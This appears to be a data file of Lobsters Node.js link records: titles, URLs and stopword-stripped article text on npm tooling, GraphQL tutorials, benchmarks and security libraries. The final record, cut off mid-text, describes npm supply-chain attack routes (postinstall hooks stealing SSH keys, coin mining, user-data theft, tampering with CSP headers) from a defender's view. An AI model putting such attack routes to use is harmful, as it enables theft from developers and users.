140,Lobsters,nodejs,Node.js programming,Introducing Package Diff: A service for diffing npm packages,https://medium.com/intrinsic/introducing-package-diff-for-npm-e6487cc9b434,introducing package diff service diffing npm package,package diff eventstream actively malicious package diff,github great tool view modification code repository de facto source code repository open source community likewise npm great package repository distributing javascript module also repository choice nodejs community said neither github code repository provides perfect relationship code commits npm package releasesby convention running npm version create git tag format like strict enforcement git tag snapshot code released npm fact often author may create version modify readme followup commit finally running npm publish even prepublish script npmignore file ensure difference source code repository package contentsthere requirement code uploaded npm module equivalent code stored publicly git repositorythat built package diff inspiration mikeal rogers tool essentially mikeal described downloads package tarballs npm repository source truth package content recursively compare difference file within packageeach comparison represented permalink containing package name two version number table content left list file changed two version list changed file along line context provided right columnscreenshot package diff showing introduced vulnerabilitythis tool used many purpose developer use view change module time perhaps discover increased size also used conversation explain new package release violated semver even used provide convenient gui describing diffs package hosted repository ui personal git repositorythe usecase excited intrinsic security audit mentioned underlying git repository always trusted show package difference case eventstream incident mean github url always cut excited potential tool used malicious package postmortem either accidental actively malicious since package diff always show exact difference package release example list security issue introduced module please experiment package diff reply comment interesting package comparison find
141,Lobsters,nodejs,Node.js programming,fx now supports streaming JSON,https://github.com/antonmedv/fx,fx support streaming json,feature install release usage interactive mode fxrc documentation documentation link related license mit,function execution commandline json processing tool feature easy use standalone binary interactive mode streaming support install via homebrew download standalone binary release bash curl l http fxwtf usage start interactive mode without passing argument passing filename first argument pas json file cat foojson barjson bazjson fx message use full power javascript curl fx filter x xstartswith access lodash ramda etc method using fxrc file curl fx groupby commitcommittername mapvalues size update json using spread operator echo count fx count count print formatted json stdout pipe json log stream fx kubectl log f fx message try documentation see full documentation link related license mit
142,Lobsters,nodejs,Node.js programming,Benchmarking Go vs Node vs Elixir,https://stressgrid.com/blog/benchmarking_go_vs_node_vs_elixir/,benchmarking go v node v elixir,cowboy http gitlabcomstressgriddummies connection test connection test methodology stressgrid conclusion discussion lobster discussion hacker news,benchmark test compare three web application node elixir cowboy subjecting synthetic workload first later connection simulate generic web application client server behavior devised following synthetic workload client device open connection sends request millisecond one server handle request sleeping millisecond simulate backend database request return kb payload without additional delay result average connection lifetime second average load request per second per device first test set target simulate device aws instance vcpus gib ram second test set target simulate device aws instance vcpus gib ram correspondingly target load request per second test run consisted rampup target device count load minute sustained target device count load finally rampdown back test take hour complete metric collected two source first collected following metric client device time open connection time sending request receiving http header corresponding response time receiving http header receiving entire http body metric aggregated client device histogram retain distribution characteristic addition summary metric total number open connection average request per second collected second source metric target server collected network cpu utilization used ubuntu kernel sysctld override seen test webservers go version node version erlang cowboy ranch source code test application available http gitlabcomstressgriddummies connection test test test webservers achieved target connection count go elixir mostly keeping target load request per second node due latency see later maxing slightly request per second time open connection averaged singledigit millisecond mostly across three subject exception go hiccup rampup phase time receive request header includes artificial delay millisecond randomization go elixir similar reflecting delay addition constant network latency story node different observe adding latency immediately followed big jump latency latency deviation minute run rampup hit request per second time receive request body averaged singledigit microsecond sustained phase go node elixir similar inbound network utilization similar three test application sustained phase mb per second make one request around byte outbound network utilization closely correlated request per second node somewhat lagging behind sustained phase around mb per second mean every payload byte protocol overhead cpu utilization thing get interesting node application utilized least amount cpu time achieved maximum cpu utilization still rampup phase seen go elixir demonstrated similar performance characteristic perspective yet elixir achieved result significantly higher cpu utilization connection test test go elixir reached target connection count node peaked connection go elixir also able keep sustained target load request per second node maxed request per second second rampup phase connection node became severely overloaded connection taking singledigit second open go elixir remained low singledigit millisecond open connection hiccup node overloaded average time receive request header grew second go elixir time receive request header remained around millisecond notably elixir maintained nearlyconstant performance throughout entire test average slowed millisecond reaching connection time receive request body remained singledigit microsecond distribution similar test likely mean testing client side network utilization grew proportionally test go elixir peaked mb outbound network gigabit per second mean wanted achieve workload would come close saturating gb link node peaking target workload also showed network utilization corresponding handled load cpu utilization confirms finding test go efficient using cpu would headroom application computeintensive elixir nearly saturated core delivering surprisingly consistent performance node exhausted scalability limit utilizing singledigit percent available cpu resource methodology run test used stressgrid framework generator device generator device stressgrid monitor cpu utilization generator avoid skewed result due generator oversaturation test generator stayed cpu utilization target generator instance placed single vpc two availability zone using internal ip network communication approach tried simulate typical behavior load balancer ondemand instance test cost around test cost around including data transfer conclusion goal benchmark analyze go node elixir exhibit observed behavior instead wanted quantify behavior reader familiar internal working system reflect strong weak side reader already using one system planning migrate one another hope provide backofthenapkin guideline help capacity planning also welcome suggestion improve benchmarking approach discussion lobster discussion hacker news
143,Lobsters,nodejs,Node.js programming,GitHub Spray: Generate spray for your GitHub contribution graph,https://github.com/Annihil/github-spray,github spray generate spray github contribution graph,github spray installation requirement usage font invert color flip vertical flip horizontal custom pattern use github spray generator graphically draw pattern custom start date multiplier scale color known issue,github spray cli generate spray github contribution history graph installation requirement usage create new github repository copy url githubspray text multiplier factor push origin githubrepositoryurl example githubspray hello multiplier push origin http githubcomjohnhellogit depending number contribution given period want spray need multiply number commit per day specific factor multiplier spray become relevant calendar heatmap font githubspray text font fontname example githubspray font portablevengeance githubspray mario font mario font available font folder invert color flip vertical githubspray hello flipvertical flip horizontal githubspray hello fliphorizontal custom pattern use custom pattern create json file like follow number determine number commit per day thus green darkness githubspray f pathtopatternjson githubspray f patternsspaceinvadersjson use github spray generator graphically draw pattern custom start date githubspray startdate yyyymmdd date rounded nearest sunday default start date nearest sunday current date week multiplier scale color githubspray factor multiply number commit per day given factor make spray darker brighter calendar heatmap known issue
144,Lobsters,nodejs,Node.js programming,"How to setup a powerful API with GraphQL, Koa and MongoDB -- scalability and testing",https://www.strilliant.com/2019/01/31/how-to-setup-a-powerful-api-with-graphql-koa-and-mongodb-iii/,setup powerful api graphql koa mongodb scalability testing,moving mutation separate file http argsname update mutation http argsid http gadgetname http argsname finally delete mutation http argsid lovely http argsid import rootquery http argsid type folder testing query insomniarest open sourced disclaimer http finishing touch source code chapter checkout part deploy graphql api make secure,welcome part iii series set powerful api far achieved basic crud functionality app grows mutation count order clean codebase extract mutation dedicated file way assure code modular separated maintainable chunk let create folder graphqlmutations inside folder create addgadgetjs updategadget removegadget file simply place mutation object file export moving addgadget mutation separate filegraphqlmutationsaddgadgetjs const graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget moduleexports type gadgetgraphqltype args name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring resolve parent args const newgadget new gadget name href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname releasedate argsreleasedate bycompany argsbycompany price argsprice return newgadgetsave update mutation graphqlmutationsupdategadgetjs const graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget moduleexports type gadgetgraphqltype args id type graphqlstring name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid gadget href http gadgetname class link linkurl target blank rel external nofollow noopener noreferrer gadgetname href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname gadgetreleasedate argsreleasedate gadgetbycompany argsbycompany gadgetprice argsprice return gadgetsave updatedgadget updatedgadget catch err consolelog err finally delete mutationgraphqlmutationsremovegadgetjs const graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget moduleexports type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindoneanddelete href http argsid exec class link linkurl target blank rel external nofollow noopener noreferrer argsid exec gadget gadgetremove deletedgadget deletedgadget catch err consolelog err separate file ready change graphqlmutationsjs file const graphqlobjecttype graphqlstring require graphql const addgadget require mutationsaddgadget const updategadget require mutationsupdategadget const removegadget require mutationsremovegadget const mutation new graphqlobjecttype name mutation field addgadget updategadget removegadget moduleexports mutation lovely much cleaner projet look like graphql api getting great shape far dedicated folder mutation let query create folder query graphqlqueries place rootqueryjs file inside rootqueryjs file place query fetch data way separate folder query mutation difference query mutation read data database mutation change state database graphqlqueriesrootqueryjs const graphqlobjecttype graphqlstring graphqllist require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget const queryallgadgets require queryallgadgets const rootquery new graphqlobjecttype name rootquerytype field gadget type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid moduleexports rootquery import rootquery schemajsconst graphqlschema require graphql const rootquery require queriesrootquery const mutation require mutation moduleexports new graphqlschema query rootquery mutation mutation inside rootquery specify query create file fetching gadget fetching gadget id graphqlqueriesqueryallgadgetsjs graphqlqueriesquerygadgetbyidjs place following logic inside graphqlqueriesquerygadgetbyidjs const graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget moduleexports type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid fetching gadget graphqlqueriesqueryallgadgetsjs const graphqllist require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget moduleexports type new graphqllist gadgetgraphqltype args resolve return gadgetfind notice new type graphqllist used want return list gadget case import query rootquery const graphqlobjecttype require graphql const gadget require modelsgadget const queryallgadgets require queryallgadgets const querygadgetbyid require querygadgetbyid const rootquery new graphqlobjecttype name rootquerytype field querygadgetbyid queryallgadgets moduleexports rootquery voila let query gadget database graphql query queryallgadgets name id price releasedate bycompany project structure look like following dedicated folder querying mutating type folderideally want folder graphql type well let move gadgettypejs graphqltypesgadgettypejs forget update path use gadgettype mutation query const gadgetgraphqltype require typesgadgettype testing queriesbefore moving advanced concept like show tool let u query graphql query ever used postman insomnia feel home head insomniarest download client use insomnia since free great functionality box open sourced disclaimer affiliated like tool open tool create new request called queryallgadgets top place localhost address http specify body graphql finally place graphql query inside body request voila query graphql headless manner like rest rest graphql finishing touchesadding query insomnia hitting save way quick access query save project need later beautiful successfully refactored graphql scalable version headless testing source code chapter checkout part deploy graphql api make secure thanks reading
145,Lobsters,nodejs,Node.js programming,"How to setup a powerful API with GraphQL, Koa and MongoDB -- CRUD actions",https://www.strilliant.com/2019/01/30/how-to-setup-a-powerful-api-with-graphql-koa-and-mongodb-mutatations-fields-resolvers/,setup powerful api graphql koa mongodb crud action,part mutation mutation rescue adding record database http argsname save http argsname firing mutation query editing record database graphql mutation http argsname http argsid check article wrote http argsid http gadgetname http argsname http argsid http gadgetname http argsname findoneanddelete http argsid note source chapter see part cool stuff,series learn setup powerful api graphql koa mongo primary focus graphql check part yet mutationsso far read data big chance need edit data recordsdocuments complete data platform need way modify serverside data well okay imagine company launched new gadget would go adding record database graphql mutation rescue think mutation like post put rest action setting mutation quite straightforward let jump adding record databasecreate file graphqlmutationsjs inside file place mutation const graphqlobjecttype graphqlobjecttype require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget const mutation new graphqlobjecttype name mutation field moduleexports mutation need import graphqlobjecttype graphqlobjecttype object graphql library import graphql type gadget import gadget mongoose model importing stuff need go creating mutation mutation plain graphqlobjecttype like query two main property interested name mutation appears graphiql doc field place mutation logic const mutation new graphqlobjecttype name mutation field addgadget notice added new object inside field object called addgadget would exactly say inside addgadget access three property type args resolve const mutation new graphqlobjecttype name mutation field addgadget type gadgetgraphqltype addgadget type gadgetgraphqltype gadget property allowed gadgetgraphqltype type declared earlier addgadget query accepts argument argument needed specify gadget want add database const mutation new graphqlobjecttype name mutation field addgadget type gadgetgraphqltype args name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring declare upfront argument query accepts type argument happens query precisely resolve function remember resolve function two parent args interested args since value pas query resolve parent args inside resolve place logic creating new mongo record const newgadget new gadget name href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname releasedate argsreleasedate bycompany argsbycompany price argsprice return newgadgetsave create new instance gadget mongoose model pas prop receive graphql new field finally save record full mutation look graphlmutationsjs const graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget const mutation new graphqlobjecttype name mutation field addgadget type gadgetgraphqltype args name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring resolve parent args const newgadget new gadget name href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname releasedate argsreleasedate bycompany argsbycompany price argsprice return newgadgetsave moduleexports mutation voila need import mutation schemajs file graphlschemajs const mutation require mutation moduleexports new graphqlschema query rootquery mutation mutation everything went fine see graphiql click notice graphql creates automatically selfdocumentation strong typing firing mutation query mutation plain graphql query take argument save mongo database return property want catch every mutation need marked mutation voila successfully created inserted new gadget mongo database head mlab whatever provider see new record complete query mutation mutation addgadget name macbook pro releasedate january bycompany apple price name releasedate bycompany price good job editing record databasewhat want edit preexisting record surely rely never making typo price change editing record also mutation remember every time want changeadd new graphql mutation open graphqlmutations file create another mutation mutation plain object const mutation new graphqlobjecttype name mutation field addgadget type gadgetgraphqltype args name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring resolve parent args const newgadget new gadget name href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname releasedate argsreleasedate bycompany argsbycompany price argsprice return newgadgetsave updategadget type gadgetgraphqltype args id type graphqlstring name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring resolve parent args notice new mutation called updategadget pretty much replica previous mutation notice extra argument need find existing gadget change find gadget id resolve function get interesting ideally want find gadget id change prop save would go mongoose give u method called findbyid resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid return promise consolelog promise see huge blob property attached promise chain method promise stranger check article wrote resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid gadget href http gadgetname class link linkurl target blank rel external nofollow noopener noreferrer gadgetname href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname gadgetreleasedate argsreleasedate gadgetbycompany argsbycompany gadgetprice argsprice return gadgetsave like find gadget change prop save return another promise need resolve resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid gadget href http gadgetname class link linkurl target blank rel external nofollow noopener noreferrer gadgetname href http argsname class link linkurl target blank rel external nofollow noopener noreferrer argsname gadgetreleasedate argsreleasedate gadgetbycompany argsbycompany gadgetprice argsprice return gadgetsave updatedgadget updatedgadget catch err consolelog err catch error handling incase run error remember monitor log via log command run error logged logger query time look mongo table pick random id edit corresponding gadget inspect database see edited record voila success query updategadget mutation mutation updategadget id name macbook pro releasedate january bycompany apple price id name releasedate bycompany price okay good job making far far create read update missing final elete deleting record mongo database quite straightforward need another mutation since fact mutating database deleting record mongoose give u handy method called findoneanddelete findoneanddelete removegadget type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindoneanddelete href http argsid exec class link linkurl target blank rel external nofollow noopener noreferrer argsid exec gadget gadgetremove deletedgadget deletedgadget catch err consolelog err deleting record take one argument id find gadget id delete return error log query mutation removegadget id id name releasedate bycompany price note make sure id correct exist database otherwise work head database inspect indeed record got deleted database well done achieved basic crud functionality notice graphql thin layer database view supposed replace database rather make easier work data fetching manipulating source chapter see part cool stuff thanks reading
146,Lobsters,nodejs,Node.js programming,Swiss Army knife for Unix permissions,https://github.com/ehmicky/unix-permissions,swiss army knife unix permission,unix file permission shape symbolic octal list character nodejs cli command testing setting unsetting validating normalizing inverting minimal maximal example demo install usage javascript usage cli permission type setuid setgid sticky type full documentation method convertoctalnumberstatsymbolicobject permission full documentation type permission full documentation normalize permission full documentation positive permission full documentation contain permission permission full documentation equal permission permission full documentation set permission permission full documentation permission full documentation invert permission full documentation min permission full documentation max permission full documentation support submit issue github chat u gitter code conduct contributing guideline,swiss army knife unix permission unix file permission take many shape symbolic ugrw octal list character drwrw library enables using instead limited single one nodejs cli command library also perform operation unix permission testing setting unsetting using bitwise operation tedious errorprone otherwise validating syntax normalizing example ur uw shortened urw inverting example umask mean new file created permission checking minimal maximal permission among list useful aggregate permission several file eg directory recursion permission manipulated string file path mean must use utility chmod stat get set file permission using string example javascript retrieve file permission object like user write false read true instead number convertobject fsstatsync etcpasswd mode set file permission using symbolic notation instead number fschmod etcpasswd convertnumber ar set file permission using symbolic notation instead number fswritefile myfile content mode convertnumber ar disallow executing new file using umask processumask convertnumber invert ax library take unix permission input using unixpermissions hood let user choose favorite unix permission type mylibrarymethod mode awx mylibrarymethod mode command line stat c etcpasswd unixpermissions convertsymbolic stat c etcpasswd urw gor demo try library install npm install unixpermissions usage javascript const convert require unixpermissions permission set rwrw const permission convertstat several method convert available mostly follow pattern permission string passed input returned output usage cli unixpermissions convertstat rwrw method javascript available exit code error occurred eg permission syntax invalid permission type use following permission type input also convert octal string like decimal number like stat like rwrwr symbolic like arw object like user read true write false execute false group write false others write false special permission setuid setgid sticky used please see type full documentation method convertoctalnumberstatsymbolicobject permission convert permission another type full documentation type permission return permission type invalid full documentation normalize permission normalizes permission canonical shape throw permission invalid full documentation positive permission remove negative permission full documentation contain permission permission test whether permission includes permission full documentation equal permission permission test whether permission equal exactly permission full documentation set permission permission set permission permission useful avoid errorprone bitwise operation full documentation permission inverts permission including special permission used combination set unset permission instead setting full documentation invert permission inverts permission remove special permission full documentation min permission retrieves lowest permission among argument full documentation max permission retrieves highest permission among argument full documentation support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome
147,Lobsters,nodejs,Node.js programming,Electronegativity is a tool to identify misconfigurations and security anti-patterns in Electron app,https://github.com/doyensec/electronegativity,electronegativity tool identify misconfigurations security antipatterns electron app,electronegativity electronegativity electronegativity electron electron security checklist guide developer auditor electronegativity study electron security doyensec blog installation usage cli programmatically contributing contributingmd credit contributor doyensec llc engage u break,electronegativity electronegativity electronegativity tool identify misconfigurations security antipatterns electronbased application leverage ast dom parsing look securityrelevant configuration described electron security checklist guide developer auditor whitepaper software developer security auditor use tool detect mitigate potential weakness implementation bug developing application using electron good understanding electron security still required using electronegativity potential issue detected tool require manual investigation interested electron security look blackhat research electronegativity study electron security keep eye doyensec blog installation major release pushed npm simply installed using npm install doyensecelectronegativity g usage cli electronegativity h option description v output version number input input directory j html asar l check run specified check passed csv format severity return finding specified level severity c confidence return finding specified level confidence output filename csv sarif save result file csv sarif format r relative show relative path file v verbose show description finding u upgrade run electron upgrade check eg u check upgrade electron e electronversion assume set electron version overriding detected one eg e treat using electron h help output usage information using electronegativity look issue directory containing electron app electronegativity pathtoelectronapp using electronegativity look issue asar archive saving result csv file electronegativity pathtoasararchive resultcsv using electronegativity upgrading one version electron another find breaking change electronegativity pathtoelectronapp v u note running fatal error javascript heap memory run node using node electronegativity pathtoasararchive resultcsv programmatically also use electronegativity programmatically using similar option cli const run require doyensecelectronegativity import run doyensecelectronegativity run input directory j html asar input pathtoelectronapp save result file csv sarif format optional output pathforoutputfile true save output sarif false save csv optional issarif false run specified check optional customscan dangerousfunctionsjscheck remotemodulejscheck return finding specified level severity optional severityset high return finding specified level confidence optional confidenceset certain show relative path file optional isrelative false run electron upgrade check eg u check upgrade electron optional electronupgrade assume set electron version overriding detected one electronversion result consolelog result catch err consoleerror err result contains number global atomic check error encountered parsing array issue found like globalchecks atomicchecks error file tsmainmaints sample shellopenexternal url location line column id openexternaljscheck description review use openexternal property undefined severity value name medium format function format confidence value name tentative format function format manualreview true shortenedurl http gitiojeumc file tsmainmaints sample const popup new browserwindow option location line column id contextisolationjscheck description review use contextisolation option property undefined severity value name high format function format confidence value name firm format function format manualreview false shortenedurl http contributing thinking contributing project please take look contributingmd credit electronegativity made possible thanks work many contributor project sponsored doyensec llc engage u break electronjs application
148,Lobsters,nodejs,Node.js programming,"How to setup a powerful API with GraphQL, Koa and MongoDB",https://www.strilliant.com/2019/01/27/how-to-setup-a-powerful-api-with-graphql-koa-and-mongodb/,setup powerful api graphql koa mongodb,koa koa github repository express github repository getting started graphql note encourage take look article unfamiliar setting mongodb mlabcom creating mongodb creating mongodb user installing mongose creating file mongodb indrek note note mongodb model note graphql query http argsid model http argsid http end source code found part ii twitter,building api super fun especially leverage modern technology koa graphql mongodb koa node framework like express node framework replace express koa since koa us asyncawait syntax callback koa github repository express github repository getting startedthe prerequisite building api following node installed text editor pick visual studio code terminal browser everything need please proceed please install open terminal create node project like far created project folder initialized fresh node project npm package available use install koa mongo graphql let install koa npm npm koa starting new koa server simple need serverjs file content const koa require koa const app new koa applisten appon error err logerror server error err starting project node graphqlwe need two package setup graphql koa koamount koagraphql npm koamount koagraphql graphql requires pas initial schema graphql server let create one place graphql schema graphqlschemajs const buildschema require graphql const schema buildschema type query hello string moduleexports schema pas initial query buildschema function note notice argument buildschema template literal encourage take look article unfamiliar pas initial schema graphql server appuse mount graphql graphqlhttp schema schema graphiql true forget import koamount koagraphql finally schemajs const mount require koamount const graphqlhttp require koagraphql const schema require graphqlschema head voila initial setup done useful yet ideally would like query graphql save data mongodb read setting mongodbin order read write graphql need place read mongo come handy save read data make thing simpler gon na use cloud instance mongo head mlabcom create user mongo database creating mongodb created need user database creating mongodb user use mongodb paired mongoose remote url database mongodb installing mongosenpm mongoose creating databasejs filewe create dedicated file databse connection const mongoose require mongoose const initdb mongooseconnect mongodb indrek usenewurlparser true mongooseconnectiononce open consolelog connected database moduleexports initdb note make sure use username credential database block code try connect remote mongodb need call somewhere open serverjs require call method const initdb require database initdb everything correct console tell u connected succesfully bravo notice annoying constantly refresh server let solve package called production process manager nodejs application builtin load balancer allows keep application alive forever reload without downtime facilitate common system admin task npm install g add script called start packagejson script start start serverjs lovely run background free terminal ever want stop process run kill restart server time automatically note log return console log statement terminal mongodb modelsif ever worked mongo aware mongodb let u creates model data neat way u structure data look like create folder model inside file gadgetsjs const mongoose require mongoose const schema mongooseschema const gadgetschema new schema name string releasedate date bycompany string price number moduleexports mongoosemodel gadget gadgetschema note id field schema mongoose assign id default schema great let also add collection dummy data collection name map gadget name plural gadget case creating collection insert document json format like mongo let fetch data graphql graphql queriesgraphql requires u create type well think like instruction computer graphqlgadgettypejs const graphql require graphql const graphqlobjecttype graphqlstring graphql const gadgettype new graphqlobjecttype name gadget field moduleexports gadgettype notice created graphql type inside field specify property given type const graphql require graphql const graphqlobjecttype graphqlobjecttype graphql const gadgettype new graphqlobjecttype name gadget field id type graphqlstring name type graphqlstring releasedate type graphqlstring bycompany type graphqlstring price type graphqlstring moduleexports gadgettype notice graphqlobjecttype graphqlobjecttype type deconstruct graphql primitive type graphql creating graphql type also grant typehinting use creating query last thing need refactor schemajs want query gadget id import gadget model gadgetgraphqltype graphql type graphqlschema graphqlobjecttype graphqlstring graphql schemajs const graphqlschema graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget next need root query every graphql query start curly bracket root query const rootquery new graphqlobjecttype name rootquerytype field voila inside field specify gadget query const rootquery new graphqlobjecttype name rootquerytype field gadget type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid notice three property inside gadget query type type query gadgetgraphqltype case args provide argument graphql query like gadget id resolve want resolve query happen query made return gadget model id finally export moduleexports new graphqlschema query rootquery file schemajs file look like const graphqlschema graphqlobjecttype graphqlstring require graphql const gadgetgraphqltype require gadgettype const gadget require modelsgadget const rootquery new graphqlobjecttype name rootquerytype field gadget type gadgetgraphqltype args id type graphqlstring resolve parent args return gadgetfindbyid href http argsid class link linkurl target blank rel external nofollow noopener noreferrer argsid moduleexports new graphqlschema query rootquery head http make query gadget id name price bycompany releasedate id end thanks reading source code found part ii discover mutation create delete update read record mongodb graphql keep date twitter
149,Lobsters,nodejs,Node.js programming,blockade - secure headers and cookies for Node.js web frameworks,https://github.com/TypeError/blockade,blockade secure header cooky nodejs web framework,blockade supported nodejs web framework adonisjs express fastify hapi koa meteor nest polka restify sail totaljs install secure header example default http response header secure cookie example default setcookie http response header documentation http blockadejsreadthedocsio resource,blockade blockade lightweight package add optional security header cookie attribute nodejs web framework security http header cookie attribute help enhance security web application enabling builtin browser security mechanism supported nodejs web framework adonisjs express fastify hapi koa meteor nest polka restify sail totaljs install installing blockade const blockade require blockade const secureheaders new blockadesecureheaders const securecookie new blockadesecurecookie secure header example secureheadersframework response default http response header stricttransportsecurity includesubdomains xframeoptions sameorigin xxssprotection modeblock xcontenttypeoptions nosniff referrerpolicy noreferrer strictoriginwhencrossorigin cachecontrol nocache nostore mustrevalidate pragma nocache expires secure cookie example securecookieframework response foo bar default setcookie http response header setcookie foobar path secure httponly samesitelax documentation please see full set documentation http blockadejsreadthedocsio resource
150,Lobsters,nodejs,Node.js programming,Yarn's Future - v2 and beyond,https://github.com/yarnpkg/yarn/issues/6953,yarn future beyond,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
151,Lobsters,nodejs,Node.js programming,Portable Node.js guide,https://github.com/ehmicky/portable-node-guide,portable nodejs guide,care nodejs user survey table content summary see also support submit issue github chat u gitter code conduct contributing guideline,write crossplatform nodejs code care according nodejs user survey nodejs developer use window locally use mac production use linux use bsd table content summary see also support found error would like add information nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix error add information please check guideline pull request welcome thanks go wonderful people
152,Lobsters,nodejs,Node.js programming,What happens when packages go bad?,https://jakearchibald.com/2018/when-packages-go-bad/,happens package go bad,spritecowcom package go bad drama treat npm package potentially hostile squooshapp code github netlify build deploys live branch david gilbertson article attack developer attack server attack user coin mining stealing user data content change subtle content change recovering successful hack limiting attack noticing attack deploy spotting visual change build pr branch spotting unexpected source change performance reason preview production conclusion uh oh,built spritecowcom back longer actively maintain month ago user berated using crypto currency miner site without informed consent sure enough site j small addition loaded mining j sent result somewhere else still sure happened guess someone gained access amazon bucket hosted site made change bucket owned agency used work longer access either careless key dunno maybe accidentally committed failed purge git history still control domain able deploy site somewhere else without coin miner point domain new location don flat cap day knew site hacked greeted greenonblack text stating site hackersaurus crew also get animated gifs skull really lucky picture big ol arse stealthy crypto bullshit hack breakin recent event got thinking attack malicious code unwittingly invited package go bad case missed drama roughly happened original author eventstream longer interested maintaining code someone offered take burden original author agreed new owner turned malicious intent modified eventstream way made targeted change build another app copay bitcoin management electron app used eventstream dependency result version copay would essentially try rob user think author eventstream wrong thing handed key package without sort vetting publicised incident might done thing sure many others done leave u small j project easily build npm dependency executed nodejs context others run browser perhaps apps deal user data especially password finance audit every package every change package perhaps need kind chainoftrust audited package nt u auditing package nonstarter remaining option treat npm package potentially hostile kinda terrifying recently launched squooshapp static web app heavy lifting frontend nt server component nt store transfer user data code github netlify build deploys live branch feel like small attack surface yet use package direct dependency vast majority dependency dependency dependency etc etc web app nt use lot third party code package part build system thought exercise explored kind power evil dependency could anything could done prevent got friend review draft article pointed lot crossover david gilbertson article earlier year right kinda gutting anyway told enough difference warrant posting worried people nice attack developer module package executed node context power user called node mean whatever cli including transferring ssh key elsewhere deleting stuff encoding holding ransom crawling project secret stuff course npm delete package found evil stuff seen eventstream case possible malicious package go unnoticed month nt even need require package give access system npm package postinstall hook packagejson name nodesass script postinstall node scriptsbuildjs run npm install project package run cli command behalf squoosh might interesting target folk running npm install often googlers ssh key might particularly valuable although combination passphrases twofactor auth reduce usefulness key googlers also good target corporate espionage attacker would search local filesystem network company secret one solution browser sandbox script done using virtual machine access single directory host docker make relatively easy virtual machine easily torn rebuilt maybe something npm default course package need wider system access course could run unsafenosandbox flag whatever attack server basically attacker aim infect server could monitor edit thing server perhaps data code belonging site solution sandbox code standard practice lot host already netlify exception going talk lot netlify since using stuff applies firebase app engine etc etc attack user push live branch netlify clone run build script serf content build directory malicious package dependency whatever want checked copy repo including built file netlify support header redirects file generated build time along modifying served content attacker could modify netlify also support cloud function nt use enabled via netlifytoml configuration root repo however told read npm install malicious package wo nt able enable cloud function phew however header redirect part netlifytoml read build another vector watch could attack look like coin mining similar abuse user resource carrying ddos attack user tend notice attack like due excessive cpu usage although might harder spot squoosh since us cpu image compression stealing user data squoosh work client meaning image opengenerate app nt leave machine however malicious script could send picture elsewhere user may spot unexpected network request devtools content change old school hacker crew proudly boast attack along picture excessivelysized arse user likely spot giant arse subtle content change add something like donate link go account owned attacker user may think intentional might take someone involved project spot let start worstcase scenario recovering successful hack job get everything back normal quickly possible first step redeploy without malicious package site fixed everyone nt visit site hacked everyone else depends crafty attacker may modified header give malicious resource long cache time squoosh hash resource url avoid lot caching issue easily leaf root html service worker script without service worker user might continue get hacked html http cache long time service worker give u bit control user visit squoosh browser check update service worker background new unhacked service worker good position look current state thing decide user running hacked version case need get rid anything hacked version may compromised best way burn start new service worker could dump cache unregister navigate client emergency url would serve clearsitedata header deleting everything stored cached origin redirect addeventlistener install event eventwaituntil async function isrunninghackedversion const cachename await cacheskeys await cachesdelete cachename await registrationunregister const allclients await clientsmatchall includeuncontrolled true const client allclients clientnavigate emergency return unfortunately safari edge nt support clearsitedata mean http cache may still compromised work around could redirect user random number rather force browser bypass cache storing page addeventlistener install event eventwaituntil async function isrunninghackedversion const cache await cachesopen await cacheaddall new request cache reload cache reload tell browser bypass http cache way network may put response cache attacker may given service worker script long cache time spec mandate browser cap even attacker really crafty ca nt lock user hacked version longer limiting attack limit impact attack well lot attack benefit contacting another server sending result coin mining forwardingon user data course downloading giant arse imagery csp help lot contentsecuritypolicy defaultsrc self wwwgoogleanalyticscom header limit communication origin google analytics allow inline style script communication origin blocked using cloud function attacker would able make communication sameorigin make cloud function proxy data however nt using cloud function nt concern csp nt prevent coin miner using user cpu prevents attacker profiting however attacker also modify header file build trivial remove modify csp feel like need split build process trusted untrusted build would run trusted build script trusted script run untrusted script sandbox untrusted script completed trusted script set sensitive 